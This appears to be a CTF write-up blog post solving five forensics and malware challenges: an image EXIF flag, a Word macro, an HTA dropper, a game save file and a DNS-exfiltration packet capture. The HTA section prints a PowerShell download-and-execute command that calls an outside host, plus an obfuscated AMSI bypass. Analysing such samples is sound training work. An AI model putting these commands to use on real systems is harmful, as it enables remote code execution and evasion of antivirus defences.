---
layout: post
title:  "Forensics Challenges"
date:   2026-08-23 15:41:00 -0400
author: uzi
tags: [CTF]
permalink: /brunner-ctf-2026-forensics/
---
* TOC
{:toc}

## Bears

**Category**: Forensics

**Difficulty:** Beginner 

**Author:** rvsmvs

**Description**: Per new synergy guidelines, all confidential beet logistics are now embedded directly into visual brand assets. Please extract your action items from the attached mascot photo.

```shell
exiftool misc_bears/bear.png  
ExifTool Version Number         : 13.25  
File Name                       : bear.png  
Directory                       : misc_bears  
File Size                       : 39 kB  
File Modification Date/Time     : 2026:08:14 16:46:24-04:00  
File Access Date/Time           : 2026:08:14 16:46:24-04:00  
File Inode Change Date/Time     : 2026:08:21 08:48:08-04:00  
File Permissions                : -rw-r--r--  
File Type                       : PNG  
File Type Extension             : png  
MIME Type                       : image/png  
Image Width                     : 800  
Image Height                    : 600  
Bit Depth                       : 8  
Color Type                      : RGB  
Compression                     : Deflate/Inflate  
Filter                          : Adaptive  
Interlace                       : Noninterlaced  
Comment                         : brunner{b34rs_347_b337s}  
Image Size                      : 800x600  
Megapixels                      : 0.480
```

`brunner{b34rs_347_b337s}`

___

## Invoice

**Category**: Forensics Malware

**Difficulty:** Beginner  

**Author:** OddNorseman

**Description**: We got a new invoice, and the email said we missed the payment deadline!! I just can't seem to open it and the extension seems different - can you help?

**Tip:** Maybe there are tools for analyzing these types of files safely? Try checking out Didier Stevens' tool and nice little walkthrough: [`oledump.py`](https://blog.didierstevens.com/programs/oledump-py/). Or `olevba` from the [oletools](https://github.com/decalage2/oletools#download-and-install) package.

**Note:** This might trigger your anti-virus. Although defanged and safe, please always treat malware challenges like this as real and use a sandbox such as a VM or Windows Sandbox.

I get the challenge file:
```shell
file "forensics_invoice/Invoice #1337.docm"  
forensics_invoice/Invoice #1337.docm: Microsoft Word 2007+
```

Running `olevba`:
```shell
olevba "Invoice #1337.docm"  
olevba 0.60.2 on Python 3.13.5 - http://decalage.info/python/oletools  
===============================================================================  
FILE: Invoice #1337.docm  
Type: OpenXML  
WARNING  For now, VBA stomping cannot be detected for files in memory  
-------------------------------------------------------------------------------  
VBA MACRO ThisDocument.cls  
in file: word/vbaProject.bin - OLE stream: 'VBA/ThisDocument'  
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  
Private Sub Document_open()  
  
Dim flag  
flag = "brunner{" & "1_w0nt_p4y_th3m_4_d1me}"  
Dim wsh As Object  
Set wsh = VBA.CreateObject("WScript.Shell")  
Dim waitOnReturn As Boolean: waitOnReturn = True  
Dim windowStyle As Integer: windowStyle = 1  
  
wsh.Run "cmd.exe /S /C echo " & flag, windowStyle, waitOnReturn  
  
End Sub  
+----------+--------------------+---------------------------------------------+  
|Type      |Keyword             |Description                                  |  
+----------+--------------------+---------------------------------------------+  
|AutoExec  |Document_open       |Runs when the Word or Publisher document is  |  
|          |                    |opened                                       |  
|Suspicious|Shell               |May run an executable file or a system       |  
|          |                    |command                                      |  
|Suspicious|WScript.Shell       |May run an executable file or a system       |  
|          |                    |command                                      |  
|Suspicious|Run                 |May run an executable file or a system       |  
|          |                    |command                                      |  
|Suspicious|CreateObject        |May create an OLE object                     |  
|IOC       |cmd.exe             |Executable file name                         |  
+----------+--------------------+---------------------------------------------+
```

`brunner{1_w0nt_p4y_th3m_4_d1me}`

___

## Company Discount

**Category**: Malware

**Difficulty:** Easy

**Author:** OddNorseman

**Description**: I got this email about a new company discount! Seems like an amazing perk - check it out yourself!

**Note:** This challenge might trigger your antivirus. Although "defanged" and completely safe to run, please always treat malware/unknown challenges like this as real and use a sandbox such as a VM or Windows Sandbox.

I get the challenge file:
```shell
file Brunnerne_Employee_Discount_Newsletter_2026.hta  
Brunnerne_Employee_Discount_Newsletter_2026.hta: HTML document, ASCII text

cat Brunnerne_Employee_Discount_Newsletter_2026.hta | tail  
	<div class="footer">  
	  <strong>Brunnerne Inc.</strong> &nbsp;-&nbsp; Internal Employee Newsletter &nbsp;-&nbsp; August 2026  
	</div>  
  </div>  
<script language="jscript">  
		var c = "powershell.exe -w minimized /c 'iwr -UseBasicParsing https://summer-darkness-50d9.oluf-sand.workers.dev/analytics/1ca729e6-5081-48da-a9b5-c1b8c21b433b | iex'"  
;  
		new ActiveXObject('WScript.Shell').Run(c);  
</script>  
</body>  
</html>
```

They use `powershell.exe` to make a request to `https://summer-darkness-50d9.oluf-sand.workers.dev/analytics/1ca729e6-5081-48da-a9b5-c1b8c21b433b`. Lets check it out:
```shell
curl https://summer-darkness-50d9.oluf-sand.workers.dev/analytics/1ca729e6-5081-48da-a9b5-c1b8c21b433b  
  
$international = [mANaGemeNT.AUTomATION.psREFeREnCe]  
$cash = $international."aSSeMbLy"  
$flow = $cash.gEttYpe("SY"+"s"+"teM."+"maNAg"+"E"+"MeNt."+"a"+"UToma"+"t"+"iON.a"+"MSI"+"UTIL"+"s" ,   $false     ,  $true    )  
$district = "   nonpuBLIc    ,     "  
$actuary = "se  "  
$expense = " "  
$assemble = "ca"  
$group = "TatiC    ,  "  
$amass = " iGnoRE"  
$gather = "S"  
$corporate = " "  
$senior = "{0}{6}{4}{5}{3}{1}{2}{7}" -f $district,$actuary,$expense,$assemble,$group,$amass,$gather,$corporate  
$lead = $flow."GeTfIELd"("a"+"MsiIN"+"iTfAi"+"le"+"D"  ,     $senior)  
$lead.setVaLUE($null,$true)  
$follower = iwr -UseBasicParsing https://summer-darkness-50d9.oluf-sand.workers.dev/analytics/17d995a0-46e2-4c06-95d0-6165771cd1b7
```
This powershell script performs an AMSI bypass and then makes a web request.

The other sketchy link:
```shell
curl https://summer-darkness-50d9.oluf-sand.workers.dev/analytics/17d995a0-46e2-4c06-95d0-6165771cd1b7  
brunner{wh00ps_l3ts_1gn0r3_th1s_4nd_h0p3_1T_d03snt_n0t1c3}
```

`brunner{wh00ps_l3ts_1gn0r3_th1s_4nd_h0p3_1T_d03snt_n0t1c3}`

___

## Free Play

**Category**: Malware

**Difficulty:** Easy-Medium  

**Author:** Quack

**Description**: IT flagged a workstation during an asset audit and found that someone from Procurement had installed some game from 2009 on his corporate laptop. Apparently, he was obsessed with the game and had been "working from home" for three weeks, seemingly just staring at his character roster. HR wants to know what he was doing and luckily recovered his save file along with a screenshot from the backup share. Go figure out what is so special about this save file.

**Flag format:** The flag is found as a string with underscores, wrap the text in `brunner{<text>}`.

**Example:** if you found the flag `text_here`, the flag to submit would be `brunner{text_here}`.

**Note:** This challenge is fully solvable from the handout. Please do **not** attempt to obtain a game copy illegally!

I get the challenge files:
```shell
unzip forensics_free-play.zip  
Archive:  forensics_free-play.zip  
   creating: forensics_free-play/  
  inflating: forensics_free-play/SaveGame1  
  inflating: forensics_free-play/Game.jpg
```

The flag was not in the `strings` output:
```shell
strings -e l SaveGame1  
LEGO  
Star Wars  
: The Complete Saga  
LucasArts  
LEGO Star Wars - The Complete Saga  
?LUCASARTS\LEGOSTARWARSSAGA  
GAME.DAT  
Episode_I.DAT  
Episode_II.DAT  
Episode_III.DAT  
Episode_IV.DAT  
Episode_V.DAT  
Episode_VI.DAT  
[TOGGLERIGHT]  
[TOGGLELEFT]  
[CROSS]  
[JUMP]  
[CIRCLE]  
[SPECIAL]
```

I found something with `xxd`:
```shell
xxd SaveGame1 | tail -n 25  
00009cf0: 0000 0000 0000 0000 0000 0000 0000 0000  ................  
00009d00: 0000 0000 0000 0000 0000 0000 0000 0000  ................  
00009d10: 0000 0000 0000 0000 0000 0000 0000 0000  ................  
00009d20: 0003 0303 0000 0303 0003 0303 0003 0000  ................  
00009d30: 0003 0303 0000 0300 0003 0300 0303 0303  ................  
00009d40: 0003 0300 0303 0300 0003 0300 0003 0303  ................  
00009d50: 0003 0003 0303 0303 0003 0300 0003 0300  ................  
00009d60: 0003 0300 0303 0303 0003 0303 0000 0300  ................  
00009d70: 0003 0300 0000 0303 0003 0300 0003 0003  ................  
00009d80: 0003 0003 0303 0303 0003 0300 0300 0003  ................  
00009d90: 0003 0300 0303 0300 0003 0003 0303 0303  ................  
00009da0: 0003 0303 0300 0003 0003 0300 0303 0303  ................  
00009db0: 0003 0303 0003 0003 0000 0000 0000 0000  ................  
00009dc0: 0000 0000 0000 0000 0000 0000 0000 0000  ................  
00009dd0: 0000 0000 0000 0000 0000 0000 0000 0000  ................  
00009de0: 0000 0000 0000 0000 0000 0000 0000 0000  ................  
00009df0: 0000 0000 0000 0000 0000 0000 0000 0000  ................  
00009e00: 0000 0000 0000 0000 0000 0000 0000 0000  ................  
00009e10: 0000 0000 0000 0000 0000 0000 0000 0000  ................  
00009e20: 0000 0000 0000 0000 0000 0000 0000 0000  ................  
00009e30: 0000 0000 0000 0000 0000 0000 0000 0000  ................  
00009e40: 0000 0000 0000 0000 0000 0000 0000 0000  ................  
00009e50: 0000 0000 0000 0000 0000 0000 0000 0000  ................  
00009e60: 0000 0000 0000 0000 0000 0000 0000 0000  ................  
00009e70: 0000 0000 0ed8 3ab2 4100 0000            ......:.A...
```

Treating `0x03` as `1` and `0x00` as `0` results in the flag.

[cyberchef link](https://gchq.github.io/CyberChef/#recipe=From_Hexdump()Find_/_Replace(%7B'option':'Regex','string':'%5C%5Cx03'%7D,'1',true,false,true,false)Find_/_Replace(%7B'option':'Regex','string':'%5C%5Cx00'%7D,'0',true,false,true,false)From_Binary('Space',8)&input=MDAwMDlkMjA6IDAwMDMgMDMwMyAwMDAwIDAzMDMgMDAwMyAwMzAzIDAwMDMgMDAwMCAgLi4uLi4uLi4uLi4uLi4uLgowMDAwOWQzMDogMDAwMyAwMzAzIDAwMDAgMDMwMCAwMDAzIDAzMDAgMDMwMyAwMzAzICAuLi4uLi4uLi4uLi4uLi4uCjAwMDA5ZDQwOiAwMDAzIDAzMDAgMDMwMyAwMzAwIDAwMDMgMDMwMCAwMDAzIDAzMDMgIC4uLi4uLi4uLi4uLi4uLi4KMDAwMDlkNTA6IDAwMDMgMDAwMyAwMzAzIDAzMDMgMDAwMyAwMzAwIDAwMDMgMDMwMCAgLi4uLi4uLi4uLi4uLi4uLgowMDAwOWQ2MDogMDAwMyAwMzAwIDAzMDMgMDMwMyAwMDAzIDAzMDMgMDAwMCAwMzAwICAuLi4uLi4uLi4uLi4uLi4uCjAwMDA5ZDcwOiAwMDAzIDAzMDAgMDAwMCAwMzAzIDAwMDMgMDMwMCAwMDAzIDAwMDMgIC4uLi4uLi4uLi4uLi4uLi4KMDAwMDlkODA6IDAwMDMgMDAwMyAwMzAzIDAzMDMgMDAwMyAwMzAwIDAzMDAgMDAwMyAgLi4uLi4uLi4uLi4uLi4uLgowMDAwOWQ5MDogMDAwMyAwMzAwIDAzMDMgMDMwMCAwMDAzIDAwMDMgMDMwMyAwMzAzICAuLi4uLi4uLi4uLi4uLi4uCjAwMDA5ZGEwOiAwMDAzIDAzMDMgMDMwMCAwMDAzIDAwMDMgMDMwMCAwMzAzIDAzMDMgIC4uLi4uLi4uLi4uLi4uLi4KMDAwMDlkYjA6IDAwMDMgMDMwMyAwMDAzIDAwMDMgMDAwMA)

`brunner{strong_force_in_you}`

___

## The Missing Recipe

**Category**: Forensics

**Difficulty:** Medium

**Author:** H4N5

**Description**: Brunner Corporation's research department has discovered that some inappropriate Brunner images and a confidential internal recipe have disappeared from the network.

No one knows exactly when or how it happened, but several employees reported unusual network activity around the time of the incident.

Fortunately, Brunner Corporation's Security Operations Center (SOC) has a full network capture (PCAP) from the period. However, the analysts have been unable to determine what really happened.

Can you reconstruct the attack and recover the flag? (Please do not look at the pictures.)

I get the challenge pcap:
```shell
unzip forensics_the-missing-recipe.zip  
Archive:  forensics_the-missing-recipe.zip  
   creating: forensics_the-missing-recipe/  
  inflating: forensics_the-missing-recipe/the-missing-recipe.pcap
```
The pcap contains `43820` packets.

I almost immediately found suspicious dns requests:
```shell
tshark -r forensics_the-missing-recipe/the-missing-recipe.pcap -Y "dns"  
    1   0.000000 192.168.1.100 → 8.8.8.8      DNS 74 Standard query 0x0000 A www.google.com  
    3   0.438558 192.168.1.100 → 8.8.8.8      DNS 73 Standard query 0x0000 A www.bbc.co.uk  
    5   0.963560 192.168.1.100 → 8.8.8.8      DNS 71 Standard query 0x0000 A cdn.cnn.com  
 1852   2.436057 192.168.1.100 → 8.8.8.8      DNS 76 Standard query 0x771f A xdvxrcsnbacg.com  
 1853   2.456057      8.8.8.8 → 192.168.1.100 DNS 76 Standard query response 0x771f No such name A xdvxrcsnbacg.com  
 1854   2.536057 192.168.1.100 → 8.8.8.8      DNS 76 Standard query 0x8e6f A targwuwrnhos.com  
 1855   2.556057      8.8.8.8 → 192.168.1.100 DNS 108 Standard query response 0x8e6f A targwuwrnhos.com A 203.0.113.5  
 1856   2.636057 192.168.1.100 → 8.8.8.8      DNS 76 Standard query 0x2f7c A yzfwnkiegykd.com  
 1857   2.656057      8.8.8.8 → 192.168.1.100 DNS 76 Standard query response 0x2f7c No such name A yzfwnkiegykd.com  
 1858   2.736057 192.168.1.100 → 8.8.8.8      DNS 76 Standard query 0x2858 A dlltizbxordm.com  
 1859   2.756057      8.8.8.8 → 192.168.1.100 DNS 76 Standard query response 0x2858 No such name A dlltizbxordm.com  
 1860   2.836057 192.168.1.100 → 8.8.8.8      DNS 76 Standard query 0x942a A jutlsgwcbvhy.com  
 1861   2.856057      8.8.8.8 → 192.168.1.100 DNS 76 Standard query response 0x942a No such name A jutlsgwcbvhy.com  
 1862   2.879627 192.168.1.100 → 8.8.8.8      DNS 114 Standard query 0x0000 A fc2s77jar2gqgafci4mbu4clou2gfciqcerci.targwuwrnhos.com  
 1870   2.969627 192.168.1.100 → 8.8.8.8      DNS 67 Standard query 0x0000 A hack.nl  
 3559  11.529627 192.168.1.100 → 8.8.8.8      DNS 74 Standard query 0x0000 A link.powers.tw  
 3567  11.631958 192.168.1.100 → 8.8.8.8      DNS 110 Standard query 0x0000 A lmng3ntqmsxaq6prsqh6sxsoasodd6ng7.targwuwrnhos.com  
 3568  11.651958 192.168.1.100 → 8.8.8.8      DNS 74 Standard query 0x0000 A link.powers.tw  
 3576  11.741958 192.168.1.100 → 8.8.8.8      DNS 71 Standard query 0x0000 A news.mir.ru  
 6051  24.232994 192.168.1.100 → 8.8.8.8      DNS 119 Standard query 0x0000 A duzfupucvdeillyi5ljlkb6afiqwyfrjnay5pnklod.targwuwrnhos.com  
 6062  24.352994 192.168.1.100 → 8.8.8.8      DNS 71 Standard query 0x0000 A news.mir.ru  
 9134  39.864967 192.168.1.100 → 8.8.8.8      DNS 115 Standard query 0x0000 A qoxtixy7ehdpwja3jtornpdzu2jj6ytgrasxv4.targwuwrnhos.com  
10758  48.074966 192.168.1.100 → 8.8.8.8      DNS 73 Standard query 0x0000 A update.pin.hk  
10771  48.214966 192.168.1.100 → 8.8.8.8      DNS 71 Standard query 0x0000 A news.mir.ru  
10779  48.306018 192.168.1.100 → 8.8.8.8      DNS 123 Standard query 0x0000 A 5hxgw3orxpsqbhpoe5erkscaqeabosaecyavwisqqj4yjq.targwuwrnhos.com  
14361  66.341018 192.168.1.100 → 8.8.8.8      DNS 74 Standard query 0x0000 A link.powers.tw  
21515 102.421018 192.168.1.100 → 8.8.8.8      DNS 83 Standard query 0x8e9d A update.targwuwrnhos.com  
21516 102.471018  203.0.113.5 → 192.168.1.100 DNS 155 Standard query response 0x8e9d A update.targwuwrnhos.com TXT  
21517 102.501017 192.168.1.100 → 8.8.8.8      DNS 71 Standard query 0x0000 A news.mir.ru  
21518 102.579499 192.168.1.100 → 8.8.8.8      DNS 121 Standard query 0x0000 A fc2s77laaaaaccaaawssaz5yzsflg72nnx22cvaj6s55.targwuwrnhos.com  
21519 102.615373 192.168.1.100 → 8.8.8.8      DNS 127 Standard query 0x0000 A 5mlpk3pxrnxylqcen2zxo6qb444dug4lpqbgvqmi2vusir5hkq.targwuwrnhos.com  
25740 123.815373 192.168.1.100 → 8.8.8.8      DNS 73 Standard query 0x0000 A update.pin.hk  
31525 152.940108 192.168.1.100 → 8.8.8.8      DNS 118 Standard query 0x0000 A jeqx2io53yrgk6y7wn6bht6s7aogmxh66a6xjytmn.targwuwrnhos.com  
31526 152.960108 192.168.1.100 → 8.8.8.8      DNS 67 Standard query 0x0000 A hack.nl  
31539 153.150410 192.168.1.100 → 8.8.8.8      DNS 112 Standard query 0x0000 A 3j4iya4bqkzebuwup56b26juiwwkefh3yf5.targwuwrnhos.com  
33445 162.914436 192.168.1.100 → 8.8.8.8      DNS 118 Standard query 0x0000 A pnucvyn4jxwhwxpotatrtyjkt7cu4vlzga5evd72b.targwuwrnhos.com  
35768 174.708755 192.168.1.100 → 8.8.8.8      DNS 118 Standard query 0x0000 A p2epbp6ywvt4tfvvndripkc57eo5vsdor2ejefs4a.targwuwrnhos.com  
35769 174.728755 192.168.1.100 → 8.8.8.8      DNS 67 Standard query 0x0000 A hack.nl  
40290 197.447641 192.168.1.100 → 8.8.8.8      DNS 113 Standard query 0x0000 A sfjoijdi7nk6xb4eb7dwaqd6ojaro56qyj4g.targwuwrnhos.com  
40308 197.637641 192.168.1.100 → 8.8.8.8      DNS 73 Standard query 0x0000 A update.pin.hk  
40316 197.762378 192.168.1.100 → 8.8.8.8      DNS 115 Standard query 0x0000 A vszaghqmrticvg2wkgsoh556dd7vsb3yg3pgay.targwuwrnhos.com  
40317 197.782378 192.168.1.100 → 8.8.8.8      DNS 73 Standard query 0x0000 A update.pin.hk  
43784 215.304094 192.168.1.100 → 8.8.8.8      DNS 127 Standard query 0x0000 A 54ianusrqrf2pxckbrjoiyqgq6oqjphrfxt55c2albqkln4wna.targwuwrnhos.com  
43805 215.524094 192.168.1.100 → 8.8.8.8      DNS 67 Standard query 0x0000 A hack.nl  
43806 215.580278 192.168.1.100 → 8.8.8.8      DNS 127 Standard query 0x0000 A rspvrbpw7t3t4zo4wc3sh7svfun4mgxl6v4675jru4nl5cahnq.targwuwrnhos.com  
43807 215.880278 192.168.1.100 → 8.8.8.8      DNS 90 Standard query 0x3b35 A brunnerlocked.targwuwrnhos.com  
43808 215.930278  203.0.113.5 → 192.168.1.100 DNS 140 Standard query response 0x3b35 A brunnerlocked.targwuwrnhos.com TXT  
43809 215.950278 192.168.1.100 → 8.8.8.8      DNS 74 Standard query 0x0000 A link.powers.tw  
43810 215.970278 192.168.1.100 → 8.8.8.8      DNS 73 Standard query 0x0000 A update.pin.hk  
43811 215.990278 192.168.1.100 → 8.8.8.8      DNS 71 Standard query 0x0000 A news.mir.ru  
43812 216.010278 192.168.1.100 → 8.8.8.8      DNS 71 Standard query 0x0000 A news.mir.ru  
43813 216.030278 192.168.1.100 → 8.8.8.8      DNS 73 Standard query 0x0000 A update.pin.hk  
43814 216.050278 192.168.1.100 → 8.8.8.8      DNS 74 Standard query 0x0000 A link.powers.tw  
43815 216.070278 192.168.1.100 → 8.8.8.8      DNS 67 Standard query 0x0000 A hack.nl  
43816 216.090278 192.168.1.100 → 8.8.8.8      DNS 71 Standard query 0x0000 A news.mir.ru  
43817 216.110278 192.168.1.100 → 8.8.8.8      DNS 67 Standard query 0x0000 A hack.nl  
43818 216.130278 192.168.1.100 → 8.8.8.8      DNS 67 Standard query 0x0000 A hack.nl  
43819 216.150278 192.168.1.100 → 8.8.8.8      DNS 67 Standard query 0x0000 A hack.nl  
43820 216.170278 192.168.1.100 → 8.8.8.8      DNS 73 Standard query 0x0000 A update.pin.hk
```

I also found this:
```shell
tshark -r the-missing-recipe.pcap -Y "dns.resp.name == \"update.targwuwrnhos.com\" or dns.resp.name == \"brunnerlocked.targwuwrnhos.com\"" -T fields -e dns.txt  
KLUv/SAQgQAAQnJ1bm4zckszeUFFU0NCQw==
```

It decodes to an AES key:
```python
python3  
Python 3.13.5 (main, Jul 15 2026, 20:25:40) [GCC 14.2.0] on linux  
Type "help", "copyright", "credits" or "license" for more information.  
>>> import base64  
... import zstandard as zstd  
...  
... b64_data = "KLUv/SAQgQAAQnJ1bm4zckszeUFFU0NCQw=="  
... compressed = base64.b64decode(b64_data)  
...  
... dctx = zstd.ZstdDecompressor()  
... key_info = dctx.decompress(compressed)  
... print(key_info)  
...  
b'Brunn3rK3yAESCBC'
```

There are two separate exfiltration streams hidden within the base32 DNS queries. The subdomain strings decode into `transfer 1` (first 5 chunks) and `transfer 2` (last 10 chunks). 

Decompressing the first base32 binary stream using Zstandard (`zstd`) to produces `part_1.bin` (unencrypted, compressed file). Then decompressing the second base32 binary stream to reveals the actual AES payload wrapper. You need to take the first 16 bytes of the decompressed payload to use as the AES CBC Initialization Vector (`IV`), and leave the rest as ciphertext. Solve script:
```python
import base64
import zstandard as zstd
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

with open("exfil_chunks.txt") as f:
    chunks = [line.strip().upper() for line in f if line.strip()]

set1 = chunks[:5]
set2 = chunks[5:]

def decode_b32(chunk_list):
    raw = "".join(chunk_list)
    pad_len = (8 - len(raw) % 8) % 8
    return base64.b32decode(raw + ("=" * pad_len))

# base32 decode both streams
b32_stream1 = decode_b32(set1)
b32_stream2 = decode_b32(set2)

dctx = zstd.ZstdDecompressor()

# decompress stream 1
try:
    image_payload = dctx.decompress(b32_stream1)
    with open("part_1.bin", "wb") as f:
        f.write(image_payload)
    print("Part 1 decompressed > part_1.bin")
except Exception as e:
    print(f"Part 1 error: {e}")

# decompress stream 2 first to obtain the AES payload
aes_payload = dctx.decompress(b32_stream2)

# decrypt the AES payload
key = b"Brunn3rK3yAESCBC"

# first 16 bytes are the IV
iv = aes_payload[:16]
ciphertext = aes_payload[16:]

cipher = AES.new(key, AES.MODE_CBC, iv)
decrypted = cipher.decrypt(ciphertext)

try:
    plaintext = unpad(decrypted, 16)
except ValueError:
    plaintext = decrypted

with open("part_2.bin", "wb") as f:
    f.write(plaintext)

print("Part 2 decrypted > part_2.bin")
```

Output:
```shell
python3 solve.py  
Part 1 decompressed > part_1.bin  
Part 2 decrypted > part_2.bin  

cat part_1.bin  
Tonight we'll encrypt their disks so they lose their Brunsviger cake recipe. brunner{k33p_53nd  
Send the encryption key, and We include the IV (venv) 

cat part_2.bin  
Ingredients  
Dough  
20 g yeast  
100 ml milk, room temperature  
40 g butter  
1 egg  
40 g sugar  
½ tsp salt  
A pinch of ground cardamom  
250 g all-purpose flour  
Filling  
150 g brown sugar  
150 g butter  
1 tsp ground cinnamon  
  
1ng_th3_me55ag3s}
```

`brunner{k33p_53nd1ng_th3_me55ag3s}`
